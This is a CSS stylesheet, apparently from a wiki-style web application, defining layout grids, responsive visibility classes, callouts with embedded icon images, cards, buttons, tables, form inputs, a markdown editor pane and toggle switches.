
.grid.right-focus { grid-template-columns: 1fr 3fr; }

.grid.gap-y-xs { row-gap: 6px; }

.grid.gap-xl { gap: 32px; }

.grid.gap-xxl { gap: 48px; }

.grid.v-center { align-items: center; }

.grid.v-end { align-items: end; }

.grid.no-gap { gap: 0px; }

.grid.no-row-gap { row-gap: 0px; }

@media screen and (max-width: 880px) {
  .grid.third:not(.no-break) { grid-template-columns: 1fr 1fr; }
  .grid.half:not(.no-break), .grid.left-focus:not(.no-break), .grid.right-focus:not(.no-break) { grid-template-columns: 1fr; }
  .grid.half.collapse-xs { grid-template-columns: 1fr 1fr; }
  .grid.gap-xl { gap: 16px; }
  .grid.right-focus.reverse-collapse > :nth-child(2) { order: 0; }
  .grid.right-focus.reverse-collapse > :nth-child(1) { order: 1; }
}

@media screen and (max-width: 600px) {
  .grid.third:not(.no-break) { grid-template-columns: 1fr; }
}

@media screen and (max-width: 400px) {
  .grid.half.collapse-xs { grid-template-columns: 1fr; }
}

#content { flex: 1 0 auto; }

body.flexbox { display: flex; flex-direction: column; align-items: stretch; height: 100%; min-height: 100%; max-height: 100%; overflow: hidden; }

body.flexbox #content { flex: 1 1 0%; display: flex; min-height: 0px; }

.flex-fill { display: flex; align-items: stretch; min-height: 0px; max-width: 100%; position: relative; }

.flex-container-row { display: flex; flex-direction: row; }

.flex-container-row.v-center { align-items: center; }

.flex-container-column { display: flex; flex-direction: column; }

.flex-container-column.wrap, .flex-container-row.wrap { flex-wrap: wrap; }

.flex { min-height: 0px; flex: 1 1 0%; max-width: 100%; }

.flex.fit-content { flex-basis: auto; flex-grow: 0; }

.justify-flex-end { justify-content: flex-end; }

.justify-center { justify-content: center; }

.justify-space-between { justify-content: space-between; }

.items-center { align-items: center; }

.block { position: relative; display: block !important; }

.inline { display: inline !important; }

.block.inline { display: inline-block !important; }

.relative { position: relative; }

.hidden { display: none !important; }

.fill-height { height: 100%; }

.float { float: left; }

.float.right { float: right; }

@media screen and (max-width: 360px) {
  .hide-under-xxs { display: none !important; }
}

@media screen and (min-width: 360px) {
  .hide-over-xxs { display: none !important; }
}

@media screen and (max-width: 400px) {
  .hide-under-xs { display: none !important; }
}

@media screen and (min-width: 400px) {
  .hide-over-xs { display: none !important; }
}

@media screen and (max-width: 600px) {
  .hide-under-s { display: none !important; }
}

@media screen and (min-width: 600px) {
  .hide-over-s { display: none !important; }
}

@media screen and (max-width: 880px) {
  .hide-under-m { display: none !important; }
}

@media screen and (min-width: 880px) {
  .hide-over-m { display: none !important; }
}

@media screen and (max-width: 1000px) {
  .hide-under-l { display: none !important; }
}

@media screen and (min-width: 1000px) {
  .hide-over-l { display: none !important; }
}

@media screen and (max-width: 1100px) {
  .hide-under-xl { display: none !important; }
}

@media screen and (min-width: 1100px) {
  .hide-over-xl { display: none !important; }
}

.rounded { border-radius: 4px; }

.dual-column-content { columns: auto 2; }

@media screen and (max-width: 880px) {
  .dual-column-content { columns: auto 1; }
}

.clearfix::before, .clearfix::after { content: " "; display: table; }

.clearfix::after { clear: both; }

.tri-layout-container { display: grid; margin-inline: 32px; grid-template-columns: 1fr 4fr 1fr; grid-template-areas: "a b c"; column-gap: 48px; }

.tri-layout-container .tri-layout-right { grid-area: c / c / c / c; min-width: 0px; }

.tri-layout-container .tri-layout-left { grid-area: a / a / a / a; min-width: 0px; }

.tri-layout-container .tri-layout-middle { grid-area: b / b / b / b; padding-top: 16px; min-width: 0px; }

@media screen and (max-width: 1400px) {
  .tri-layout-container { grid-template: "c b b" min-content "a b b" min-content ". b b" 1fr / 1fr 3fr; padding-inline-end: 24px; }
}

@media screen and (min-width: 1000px) and (max-width: 1400px) {
  .tri-layout-left { position: sticky; top: 16px; }
}

@media screen and (min-width: 1400px) {
  .tri-layout-left-contents, .tri-layout-right-contents { padding: 16px; position: sticky; top: 16px; max-height: 100vh; min-height: 50vh; overflow: hidden scroll; height: 100%; }
  .tri-layout-left-contents::-webkit-scrollbar, .tri-layout-right-contents::-webkit-scrollbar { display: none; }
  .tri-layout-middle-contents { max-width: 940px; margin: 0px auto; }
}

@media screen and (max-width: 1000px) {
  .tri-layout-container { grid-template-areas: none; grid-template-columns: 1fr; column-gap: 0px; padding-inline: 6px; }
  .tri-layout-container .tri-layout-left-contents, .tri-layout-container .tri-layout-right-contents { padding-inline: 16px; }
  .tri-layout-container .tri-layout-left > *, .tri-layout-container .tri-layout-right > * { display: none; pointer-events: none; }
  .tri-layout-container .tri-layout-left, .tri-layout-container .tri-layout-right { grid-area: 1 / 1 / auto / 1; padding-top: 0px !important; }
  .tri-layout-container .tri-layout-middle { grid-area: 3 / 1 / auto / 1; z-index: 1; overflow: hidden; transition: transform 240ms ease-in-out 0s; }
  .tri-layout-container .tri-layout-left { grid-row: 2 / auto; }
  .tri-layout-container.show-info { overflow: hidden; }
  .tri-layout-container.show-info .tri-layout-middle { display: none; }
  .tri-layout-container.show-info .tri-layout-right > *, .tri-layout-container.show-info .tri-layout-left > * { display: block; pointer-events: auto; }
}

@media screen and (min-width: 1000px) {
  .tri-layout-mobile-tabs { display: none; }
  .tri-layout-left-contents > *, .tri-layout-right-contents > * { opacity: 0.6; transition: opacity 120ms ease-in-out 0s; }
  .tri-layout-left-contents > :hover, .tri-layout-right-contents > :hover { opacity: 1; }
  .tri-layout-left-contents > :focus-within, .tri-layout-right-contents > :focus-within { opacity: 1; }
}

@media screen and (max-width: 880px) {
  .tri-layout-container { margin-inline: 0px; }
}

.callout { border-inline-start: 3px solid rgb(187, 187, 187); background-color: rgb(238, 238, 238); padding: 12px 12px 12px 32px; display: block; position: relative; overflow: auto; }

.callout::before { background-image: url("data:image/svg+xml;base64,PHN2ZyB2aWV3Qm94PSIwIDAgMjQgMjQiIGZpbGw9IiMwMTUzODAiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyI+ICAgIDxwYXRoIGQ9Ik0wIDBoMjR2MjRIMHoiIGZpbGw9Im5vbmUiLz4gICAgPHBhdGggZD0iTTEyIDJDNi40OCAyIDIgNi40OCAyIDEyczQuNDggMTAgMTAgMTAgMTAtNC40OCAxMC0xMFMxNy41MiAyIDEyIDJ6bTEgMTVoLTJ2LTZoMnY2em0wLThoLTJWN2gydjJ6Ii8+PC9zdmc+"); background-repeat: no-repeat; content: ""; width: 1.2em; height: 1.2em; left: 8px; top: 50%; margin-top: -9px; display: inline-block; position: absolute; line-height: 1; opacity: 0.8; }

.callout.success { border-left-color: rgb(15, 125, 21); background-color: rgb(234, 253, 235); color: rgb(6, 52, 9); }

html.dark-mode .callout.success { background-color: rgb(3, 25, 4); }

html.dark-mode .callout.success { color: rgb(18, 148, 25); }

.callout.success::before { background-image: url("data:image/svg+xml;base64,PHN2ZyB2aWV3Qm94PSIwIDAgMjQgMjQiIGZpbGw9IiMzNzZjMzkiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyI+ICAgIDxwYXRoIGQ9Ik0wIDBoMjR2MjRIMHoiIGZpbGw9Im5vbmUiLz4gICAgPHBhdGggZD0iTTEyIDJDNi40OCAyIDIgNi40OCAyIDEyczQuNDggMTAgMTAgMTAgMTAtNC40OCAxMC0xMFMxNy41MiAyIDEyIDJ6bS0yIDE1bC01LTUgMS40MS0xLjQxTDEwIDE0LjE3bDcuNTktNy41OUwxOSA4bC05IDl6Ii8+PC9zdmc+"); }

.callout.danger { border-left-color: rgb(171, 15, 14); background-color: rgb(252, 219, 219); color: rgb(77, 7, 6); }

html.dark-mode .callout.danger { background-color: rgb(30, 3, 2); }

html.dark-mode .callout.danger { color: rgb(195, 17, 16); }

.callout.danger::before { background-image: url("data:image/svg+xml;base64,PHN2ZyB2aWV3Qm94PSIwIDAgMjQgMjQiIGZpbGw9IiNiOTE4MTgiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyI+ICAgIDxwYXRoIGQ9Ik0xNS43MyAzSDguMjdMMyA4LjI3djcuNDZMOC4yNyAyMWg3LjQ2TDIxIDE1LjczVjguMjdMMTUuNzMgM3pNMTIgMTcuM2MtLjcyIDAtMS4zLS41OC0xLjMtMS4zIDAtLjcyLjU4LTEuMyAxLjMtMS4zLjcyIDAgMS4zLjU4IDEuMyAxLjMgMCAuNzItLjU4IDEuMy0xLjMgMS4zem0xLTQuM2gtMlY3aDJ2NnoiLz4gICAgPHBhdGggZD0iTTAgMGgyNHYyNEgweiIgZmlsbD0ibm9uZSIvPjwvc3ZnPg=="); }

.callout.info { border-left-color: rgb(2, 136, 209); color: rgb(1, 70, 108); background-color: rgb(211, 239, 255); }

html.dark-mode .callout.info { color: rgb(9, 167, 253); }

html.dark-mode .callout.info { background-color: rgb(0, 21, 32); }

.callout.warning { border-left-color: rgb(207, 77, 3); background-color: rgb(254, 227, 211); color: rgb(106, 40, 2); }

html.dark-mode .callout.warning { background-color: rgb(26, 10, 0); }

html.dark-mode .callout.warning { color: rgb(207, 77, 3); }

.callout.warning::before { background-image: url("data:image/svg+xml;base64,PHN2ZyB2aWV3Qm94PSIwIDAgMjQgMjQiIGZpbGw9IiNiNjUzMWMiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyI+ICAgIDxwYXRoIGQ9Ik0wIDBoMjR2MjRIMHoiIGZpbGw9Im5vbmUiLz4gICAgPHBhdGggZD0iTTEgMjFoMjJMMTIgMiAxIDIxem0xMi0zaC0ydi0yaDJ2MnptMC00aC0ydi00aDJ2NHoiLz48L3N2Zz4="); }

.callout a { color: inherit; text-decoration: underline; }

.card { background-color: rgb(255, 255, 255); box-shadow: rgba(0, 0, 0, 0.1) 0px 1px 6px -1px; border-radius: 3px; border: 1px solid transparent; }

html.dark-mode .card { background-color: rgb(34, 34, 34); }

.card .body, .card p.empty-text { padding: 16px; }

.card a, .card p { overflow-wrap: break-word; word-break: break-word; }

.card-title { padding: 16px 16px 6px; margin: 0px; font-size: 14px; color: rgb(34, 34, 34); fill: rgb(34, 34, 34); font-weight: 400; }

.card-title a { line-height: 1; }

.card.border-card { border: 1px solid rgb(221, 221, 221); }

.card.drag-card { border: 1px solid rgb(221, 221, 221); background-color: rgb(255, 255, 255); border-radius: 4px; display: flex; padding: 0px 0px 0px 40px; margin: 12px 0px; position: relative; }

html.dark-mode .card.drag-card { border-color: rgb(0, 0, 0); }

html.dark-mode .card.drag-card { background-color: rgb(51, 51, 51); }

.card.drag-card .drag-card-action { cursor: pointer; }

.card.drag-card .handle, .card.drag-card .drag-card-action { display: flex; align-items: center; text-align: center; justify-content: center; width: 28px; flex-grow: 0; padding: 0px 6px; }

.card.drag-card .handle:hover, .card.drag-card .drag-card-action:hover { background-color: rgb(238, 238, 238); }

.card.drag-card .handle .svg-icon, .card.drag-card .drag-card-action .svg-icon { margin-inline-end: 0px; }

.card.drag-card .outline input { margin: 12px 0px; width: 100%; }

.card.drag-card .outline { position: relative; }

.card.drag-card .handle { background-color: rgb(238, 238, 238); left: 0px; position: absolute; top: 0px; bottom: 0px; }

html.dark-mode .card.drag-card .handle { background-color: rgb(45, 45, 45); }

.card.drag-card > div { padding: 0px 12px; max-width: 80%; flex: 1 1 0%; }

.grid-card { display: flex; flex-direction: column; border: 1px solid rgb(221, 221, 221); margin-bottom: 24px; border-radius: 4px; overflow: hidden; min-width: 100px; color: rgb(68, 68, 68); transition: border-color 120ms ease-in-out 0s, box-shadow 120ms ease-in-out 0s; }

html.dark-mode .grid-card { border-color: rgb(0, 0, 0); }

.grid-card:hover { color: rgb(68, 68, 68); text-decoration: none; box-shadow: rgba(0, 0, 0, 0.1) 0px 1px 6px -1px; }

html.dark-mode .grid-card:hover { box-shadow: rgba(0, 0, 0, 0.5) 0px 1px 6px -1px; }

.grid-card h2 { width: 100%; font-size: 1.5em; margin: 0px 0px 10px; }

.grid-card p { font-size: 0.7rem; margin: 0px; line-height: 1.6em; }

.grid-card .grid-card-content { flex: 1 1 0%; border-top: 0px; border-bottom-width: 2px; }

.grid-card .grid-card-content, .grid-card .grid-card-footer { padding: 24px; }

.grid-card .grid-card-content + .grid-card-footer { padding-top: 0px; }

.book-grid-item .grid-card-footer p.small { font-size: 0.8em; margin: 0px; }

.content-wrap.card { padding: 16px 48px; margin-inline: auto; margin-bottom: 24px; overflow: initial; min-height: 60vh; }

.content-wrap.card.auto-height { min-height: 0px; }

.content-wrap.card.fill-width { width: 100%; }

@media screen and (max-width: 1400px) {
  .content-wrap.card { padding: 16px 32px; }
}

@media screen and (max-width: 880px) {
  .content-wrap.card { padding: 16px 24px; }
}

@media screen and (max-width: 600px) {
  .content-wrap.card { padding: 16px; }
}

.outline-hover { border: 1px solid transparent !important; }

.outline-hover:hover { border: 1px solid rgba(0, 0, 0, 0.1) !important; }

.fade-in-when-active { opacity: 0.6; transition: opacity 120ms ease-in-out 0s; }

.fade-in-when-active:hover, .fade-in-when-active:focus-within { opacity: 1; }

.tag-item { display: inline-flex; margin-bottom: 6px; margin-inline-end: 6px; border-radius: 4px; border: 1px solid rgb(204, 204, 204); overflow: hidden; font-size: 0.85em; }

html.dark-mode .tag-item { border-color: rgb(102, 102, 102); }

.tag-item a, .tag-item span, .tag-item a:hover, .tag-item a:active { padding: 4px 8px; color: rgba(0, 0, 0, 0.6); transition: background-color 80ms ease-in-out 0s; text-decoration: none; }

html.dark-mode .tag-item a, html.dark-mode .tag-item span, html.dark-mode .tag-item a:hover, html.dark-mode .tag-item a:active { color: rgba(255, 255, 255, 0.8); }

.tag-item a:hover { background-color: rgba(255, 255, 255, 0.7); }

html.dark-mode .tag-item a:hover { background-color: rgba(255, 255, 255, 0.3); }

.tag-item svg { fill: rgba(0, 0, 0, 0.5); }

html.dark-mode .tag-item svg { fill: rgba(255, 255, 255, 0.5); }

.tag-item .tag-value { border-inline-start: 1px solid; border-color: rgb(221, 221, 221); background-color: rgba(255, 255, 255, 0.5); }

html.dark-mode .tag-item .tag-value { border-color: rgb(102, 102, 102); }

html.dark-mode .tag-item .tag-value { background-color: rgba(255, 255, 255, 0.2); }

.tag-list div:last-child .tag-item { margin-bottom: 0px; }

.api-method { font-size: 0.75rem; background-color: rgb(136, 136, 136); padding: 6px; line-height: 1.3; opacity: 0.7; vertical-align: top; border-radius: 3px; color: rgb(255, 255, 255); display: inline-block; min-width: 60px; text-align: center; font-weight: bold; }

.api-method[data-method="GET"] { background-color: rgb(7, 123, 112); }

.api-method[data-method="POST"] { background-color: rgb(207, 77, 3); }

.api-method[data-method="PUT"] { background-color: rgb(2, 136, 209); }

.api-method[data-method="DELETE"] { background-color: rgb(171, 15, 14); }

.sticky-sidebar { position: sticky; top: 16px; max-height: calc(100vh - 16px); overflow-y: auto; }

button { background-color: transparent; border: 0px; font-size: 100%; }

.button { text-decoration: none; font-size: 0.85rem; line-height: 1.4em; padding: 7.8px 16px; margin-top: 6px; margin-bottom: 6px; display: inline-block; font-weight: 400; outline: 0px; border-radius: 2px; cursor: pointer; transition: background-color 120ms ease-in-out 0s, filter 120ms ease-in-out 0s, box-shadow 120ms ease-in-out 0s; box-shadow: none; background-color: var(--color-primary); color: rgb(255, 255, 255); text-transform: uppercase; border: 1px solid var(--color-primary); vertical-align: top; filter: none; }

html.dark-mode .button { filter: saturate(0.8) brightness(0.8); }

.button:hover, .button:focus, .button:active { background-color: var(--color-primary); text-decoration: none; color: rgb(255, 255, 255); }

.button:hover { box-shadow: rgb(204, 204, 204) 0px 0px 4px 1px; filter: brightness(110%); }

html.dark-mode .button:hover { box-shadow: rgba(0, 0, 0, 0.5) 0px 0px 4px 1px; }

.button:focus { outline: currentcolor dotted 1px; outline-offset: -6px; box-shadow: none; filter: brightness(90%); }

.button:active { outline: 0px; }

.button.outline { background-color: transparent; color: rgb(102, 102, 102); fill: currentcolor; border: 1px solid rgb(204, 204, 204); }

html.dark-mode .button.outline { color: rgb(170, 170, 170); }

.button.outline:hover, .button.outline:focus, .button.outline:active { border: 1px solid rgb(204, 204, 204); box-shadow: none; background-color: rgb(242, 242, 242); filter: none; }

html.dark-mode .button.outline:hover, html.dark-mode .button.outline:focus, html.dark-mode .button.outline:active { background-color: rgb(85, 85, 85); }

.button.outline:active { border-color: rgb(187, 187, 187); background-color: rgb(221, 221, 221); color: rgb(102, 102, 102); box-shadow: rgba(0, 0, 0, 0.1) 0px 0px 2px inset; }

.button + .button { margin-inline-start: 12px; }

.button.small { font-size: 0.75rem; padding: 7.2px 12px; }

.text-button { cursor: pointer; background-color: transparent; padding: 0px; margin: 0px; border: none; user-select: none; font-size: 0.75rem; line-height: 1.4em; color: var(--color-primary); }

html.dark-mode .text-button { color: rgb(170, 170, 170); }

.text-button:active { outline: 0px; }

.text-button:hover { text-decoration: none; }

.text-button:hover, .text-button:focus { color: var(--color-primary); fill: var(--color-primary); }

.button.block { width: 100%; text-align: start; display: block; }

.button.icon .svg-icon { margin-inline-end: 0px; }

.button.svg { display: flex; align-items: center; padding: 12px 16px 10px; width: 100%; }

.button.svg svg { display: inline-block; width: 24px; height: 24px; bottom: auto; margin-inline-end: 16px; }

.button[disabled] { background-color: rgb(187, 187, 187); cursor: default; border-color: rgb(204, 204, 204); }

.button[disabled]:hover { background-color: rgb(187, 187, 187); cursor: default; box-shadow: none; }

table { min-width: 100px; max-width: 100%; }

table thead { background-color: rgb(248, 248, 248); font-weight: 500; }

html.dark-mode table thead { background-color: rgb(51, 51, 51); }

table td, table th { min-width: 10px; padding: 6px 8px; border: 1px solid rgb(221, 221, 221); overflow: auto; line-height: 1.2; word-break: break-word; }

table td p, table th p { margin: 0px; }

table.table { width: 100%; }

table.table tr td, table.table tr th { border-bottom: 1px solid rgba(0, 0, 0, 0.05); }

table.table th, table.table td { text-align: start; border: none; padding: 12px; vertical-align: middle; margin: 0px; overflow: visible; }

table.table th { font-weight: bold; }

table.table tr:hover { background-color: rgb(238, 238, 238); }

html.dark-mode table.table tr:hover { background-color: rgb(51, 51, 51); }

table.table .text-right { text-align: end; }

table.table .text-center { text-align: center; }

table.table td.actions { overflow: visible; }

table.table a { display: inline-block; }

table.no-style td { border: 0px; padding: 0px; }

table.list-table { margin: -6px; }

table.list-table td { border: 0px; vertical-align: middle; padding: 6px; }

.input-base, input[type="text"], input[type="number"], input[type="email"], input[type="date"], input[type="search"], input[type="url"], input[type="color"], input[type="password"], select, textarea, .fake-input { border-radius: 3px; border: 1px solid rgb(212, 212, 212); background-color: rgb(255, 255, 255); color: rgb(102, 102, 102); display: inline-block; font-size: 14px; padding: 9px; width: 250px; max-width: 100%; }

html.dark-mode .input-base, html.dark-mode input[type="text"], html.dark-mode input[type="number"], html.dark-mode input[type="email"], html.dark-mode input[type="date"], html.dark-mode input[type="search"], html.dark-mode input[type="url"], html.dark-mode input[type="color"], html.dark-mode input[type="password"], html.dark-mode select, html.dark-mode textarea, html.dark-mode .fake-input { background-color: rgb(51, 51, 51); }

html.dark-mode .input-base, html.dark-mode input[type="text"], html.dark-mode input[type="number"], html.dark-mode input[type="email"], html.dark-mode input[type="date"], html.dark-mode input[type="search"], html.dark-mode input[type="url"], html.dark-mode input[type="color"], html.dark-mode input[type="password"], html.dark-mode select, html.dark-mode textarea, html.dark-mode .fake-input { border-color: rgb(17, 17, 17); }

html.dark-mode .input-base, html.dark-mode input[type="text"], html.dark-mode input[type="number"], html.dark-mode input[type="email"], html.dark-mode input[type="date"], html.dark-mode input[type="search"], html.dark-mode input[type="url"], html.dark-mode input[type="color"], html.dark-mode input[type="password"], html.dark-mode select, html.dark-mode textarea, html.dark-mode .fake-input { color: rgb(170, 170, 170); }

.input-base.neg, input.neg[type="text"], input.neg[type="number"], input.neg[type="email"], input.neg[type="date"], input.neg[type="search"], input.neg[type="url"], input.neg[type="color"], input.neg[type="password"], select.neg, textarea.neg, .neg.fake-input, .input-base.invalid, input.invalid[type="text"], input.invalid[type="number"], input.invalid[type="email"], input.invalid[type="date"], input.invalid[type="search"], input.invalid[type="url"], input.invalid[type="color"], input.invalid[type="password"], select.invalid, textarea.invalid, .invalid.fake-input { border: 1px solid rgb(171, 15, 14); }

.input-base.pos, input.pos[type="text"], input.pos[type="number"], input.pos[type="email"], input.pos[type="date"], input.pos[type="search"], input.pos[type="url"], input.pos[type="color"], input.pos[type="password"], select.pos, textarea.pos, .pos.fake-input, .input-base.valid, input.valid[type="text"], input.valid[type="number"], input.valid[type="email"], input.valid[type="date"], input.valid[type="search"], input.valid[type="url"], input.valid[type="color"], input.valid[type="password"], select.valid, textarea.valid, .valid.fake-input { border: 1px solid rgb(15, 125, 21); }

.input-base.disabled, input.disabled[type="text"], input.disabled[type="number"], input.disabled[type="email"], input.disabled[type="date"], input.disabled[type="search"], input.disabled[type="url"], input.disabled[type="color"], input.disabled[type="password"], select.disabled, textarea.disabled, .disabled.fake-input, .input-base[disabled], input[disabled][type="text"], input[disabled][type="number"], input[disabled][type="email"], input[disabled][type="date"], input[disabled][type="search"], input[disabled][type="url"], input[disabled][type="color"], input[disabled][type="password"], select[disabled], textarea[disabled], [disabled].fake-input { background: url("data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAcAAAAHCAYAAADEUlfTAAAAMUlEQVQIW2NkwAGuXbv2nxGbHEhCS0uLEUMSJgHShCKJLIEiiS4Bl8QmAZbEJQGSBAC62BuJ+tt7zgAAAABJRU5ErkJggg=="); }

.input-base[readonly], input[readonly][type="text"], input[readonly][type="number"], input[readonly][type="email"], input[readonly][type="date"], input[readonly][type="search"], input[readonly][type="url"], input[readonly][type="color"], input[readonly][type="password"], select[readonly], textarea[readonly], [readonly].fake-input { background-color: rgb(248, 248, 248); }

.input-base:focus, input[type="text"]:focus, input[type="number"]:focus, input[type="email"]:focus, input[type="date"]:focus, input[type="search"]:focus, input[type="url"]:focus, input[type="color"]:focus, input[type="password"]:focus, select:focus, textarea:focus, .fake-input:focus { border-color: var(--color-primary); outline: 1px solid var(--color-primary); }

.input-fill-width { width: 100% !important; }

.fake-input { overflow: auto; }

#html-editor { display: none; }

#markdown-editor { position: relative; z-index: 5; }

#markdown-editor #markdown-editor-input { font-style: normal; font-weight: 400; padding: 6px 16px; color: rgb(68, 68, 68); border-radius: 0px; max-height: 100%; flex: 1 1 0%; border: 0px; width: 100%; }

#markdown-editor #markdown-editor-input:focus { outline: 0px; }

#markdown-editor .markdown-display, #markdown-editor .markdown-editor-wrap { flex: 1 1 0%; position: relative; }

#markdown-editor .markdown-editor-wrap { display: flex; flex-direction: column; border: 1px solid rgb(221, 221, 221); width: 50%; max-width: 50%; }

html.dark-mode #markdown-editor .markdown-editor-wrap { border-color: rgb(0, 0, 0); }

#markdown-editor.fullscreen { position: fixed; top: 0px; left: 0px; height: 100%; z-index: 2; }

@media screen and (max-width: 880px) {
  #markdown-editor { flex-direction: column; }
  #markdown-editor .markdown-editor-wrap { width: 100%; max-width: 100%; flex-grow: 1; }
  #markdown-editor .editor-toolbar { padding: 0px; }
  #markdown-editor .editor-toolbar > * { padding: 6px 12px; }
  .editor-toolbar-label { border-bottom: 1px solid rgb(221, 221, 221); display: block; float: none !important; }
  .markdown-editor-wrap:not(.active) .editor-toolbar + div, .markdown-editor-wrap:not(.active) .editor-toolbar .buttons, .markdown-editor-wrap:not(.active) .markdown-display { display: none; }
  #markdown-editor .markdown-editor-wrap:not(.active) { flex: 0 0 auto; min-height: 0px; }
}

.markdown-display { margin-inline-start: -1px; }

.markdown-editor-display { background-color: rgb(255, 255, 255); }

.markdown-editor-display body { display: block; background-color: rgb(255, 255, 255); padding-inline: 16px; }

.markdown-editor-display [drawio-diagram]:hover { outline: 2px solid var(--color-primary); }

html.markdown-editor-display.dark-mode { background-color: rgb(34, 34, 34); }

html.markdown-editor-display.dark-mode body { background-color: rgb(34, 34, 34); }

.editor-toolbar { width: 100%; padding: 6px 16px; font-size: 11px; line-height: 1.6; border-bottom: 1px solid rgb(221, 221, 221); background-color: rgb(238, 238, 238); border-top-color: rgb(221, 221, 221); border-right-color: rgb(221, 221, 221); border-left-color: rgb(221, 221, 221); flex: 0 0 auto; }

html.dark-mode .editor-toolbar { background-color: rgb(17, 17, 17); }

html.dark-mode .editor-toolbar { border-color: rgb(0, 0, 0); }

.editor-toolbar::after { content: ""; display: block; clear: both; }

html.dark-mode .editor-toolbar button { color: rgb(170, 170, 170); }

label { color: rgb(102, 102, 102); display: block; line-height: 1.4em; font-size: 0.94em; font-weight: 400; padding-bottom: 2px; margin-bottom: 0.2em; }

html.dark-mode label { color: rgb(221, 221, 221); }

label.inline { display: inline-block; }

label.radio, label.checkbox { font-weight: 400; user-select: none; }

label.radio input[type="radio"], label.radio input[type="checkbox"], label.checkbox input[type="radio"], label.checkbox input[type="checkbox"] { margin-inline-end: 6px; }

label.inline.checkbox { margin-inline-end: 16px; }

label + p.small { margin-bottom: 0.8em; }

table.form-table { max-width: 100%; }

table.form-table td { overflow: hidden; padding: 1.5px 0px; }

select { appearance: none; background: url("data:image/svg+xml;utf8,<svg xmlns='http://www.w3.org/2000/svg' width='100' height='100' fill='%23666666'><polygon points='0,0 100,0 50,50'/></svg>") calc(100% - 20px) 70% / 12px no-repeat; }

input[type="date"] { width: 190px; }

input[type="color"] { height: 60px; }

input[type="color"].small { height: 42px; width: 60px; padding: 2px; }

.toggle-switch { user-select: none; display: inline-grid; grid-template-columns: 28px 1fr; align-items: center; margin: 16px 0px; }

.toggle-switch .custom-checkbox { width: 16px; height: 16px; border-radius: 2px; display: inline-block; border: 2px solid currentcolor; opacity: 0.6; overflow: hidden; fill: currentcolor; }

.toggle-switch .custom-checkbox .svg-icon { width: 100%; height: 100%; margin: 0px; bottom: auto; top: -1.5px; left: 0px; transition: transform 120ms ease-in-out 0s; transform: scale(0); transform-origin: center center; }

.toggle-switch input[type="checkbox"] { display: none; }

.toggle-switch input[type="checkbox"]:checked + .custom-checkbox .svg-icon { transform: scale(1); }

.toggle-switch .custom-checkbox:hover { background-color: rgba(0, 0, 0, 0.05); opacity: 0.8; }

.toggle-switch-list .toggle-switch { margin: 6px 0px; }

.toggle-switch-list.compact .toggle-switch { margin: 1px 0px; }

.form-group { margin-bottom: 12px; }

.setting-list > div { border-bottom: 1px solid rgb(221, 221, 221); padding: 32px 0px; }

.setting-list > div:last-child { border-bottom: none; }

.setting-list-label { color: rgb(34, 34, 34); font-size: 1rem; }

.setting-list-label + p.small { margin-bottom: 0px; }

.setting-list-label + .grid { margin-top: 16px; }

.setting-list .grid input[type="text"], .setting-list .grid input[type="email"], .setting-list .grid input[type="password"], .setting-list .grid select, .stretch-inputs input[type="text"], .stretch-inputs input[type="email"], .stretch-inputs input[type="password"], .stretch-inputs select { width: 100%; }

.simple-code-input { background-color: rgb(248, 248, 248); font-family: monospace; font-size: 12px; min-height: 100px; display: block; width: 100%; }

.form-group div.text-pos, .form-group div.text-neg, .form-group p.text-post, .form-group p.text-neg { padding: 6px 0px; }

.form-group[collapsible] { padding: 0px 16px; border: 1px solid rgb(221, 221, 221); border-radius: 4px; }

.form-group[collapsible] .collapse-title { margin-inline: -16px; padding: 12px 16px; display: block; width: calc(100% + 32px); text-align: start; }

.form-group[collapsible] .collapse-title, .form-group[collapsible] .collapse-title label { cursor: pointer; }

.form-group[collapsible] .collapse-title label { padding-bottom: 0px; margin-bottom: 0px; color: inherit; }

.form-group[collapsible] .collapse-title label::before { display: inline-block; content: ""; margin-inline-end: 16px; transition: all 400ms ease-in-out 0s; transform: rotate(0deg); }

.form-group[collapsible] .collapse-content { display: none; padding-bottom: 16px; }

.form-group[collapsible].open .collapse-title label::before { transform: rotate(90deg); }

.inline-input-style, .description-input textarea, .title-input input[type="text"] { display: block; width: 100%; padding: 12px; }

.title-input input[type="text"] { margin-top: 0px; font-size: 2em; }

.title-input.page-title { font-size: 0.8em; background-color: rgb(255, 255, 255); }

html.dark-mode .title-input.page-title { background-color: rgb(51, 51, 51); }

.title-input.page-title .input { border: 0px; margin-bottom: -1px; }

.title-input.page-title input[type="text"] { max-width: 840px; margin: 0px auto; border: none; }

.page-title input { display: block; width: 100%; font-size: 1.4em; }

.description-input textarea { font-size: 14px; color: rgb(102, 102, 102); width: 100%; }

div[editor-type="markdown"] .title-input.page-title input[type="text"] { max-width: 100%; border-radius: 0px; }

.search-box { max-width: 100%; position: relative; }

.search-box button { background-color: transparent; border: none; color: rgb(102, 102, 102); padding: 0px; cursor: pointer; position: absolute; left: 8px; top: 9px; }

html.dark-mode .search-box button { color: rgb(170, 170, 170); }

html[dir="rtl"] .search-box button { right: 8px; left: auto; }

.search-box input { display: block; padding-inline-start: 28px; width: 300px; max-width: 100%; }

.search-box.flexible input { width: 100%; }

.search-box .search-box-cancel { left: auto; right: 0px; }

.outline > input { border-width: 0px 0px 2px; border-top-style: initial; border-right-style: initial; border-left-style: initial; border-top-color: initial; border-right-color: initial; border-left-color: initial; border-image: initial; border-bottom-style: solid; border-bottom-color: rgb(221, 221, 221); border-radius: 0px; }

.outline > input:focus, .outline > input:active { border-width: 0px 0px 2px; border-top-style: initial; border-right-style: initial; border-left-style: initial; border-top-color: initial; border-right-color: initial; border-left-color: initial; border-image: initial; border-bottom-style: solid; border-bottom-color: rgb(170, 170, 170); outline: 0px; }

.image-picker img { background-color: rgb(187, 187, 187); max-width: 100%; }

.custom-file-input { overflow: hidden; padding: 0px; position: absolute; white-space: nowrap; width: 1px; height: 1px; border: 0px; clip: rect(0px, 0px, 0px, 0px); }

.custom-file-input:focus + label { border-color: var(--color-primary); outline: 1px solid var(--color-primary); }

.anim.fadeIn { opacity: 0; animation-name: fadeIn; animation-duration: 180ms; animation-timing-function: ease-in-out; animation-fill-mode: forwards; }

@keyframes fadeIn { 
  0% { opacity: 0; }
  100% { opacity: 1; }
}

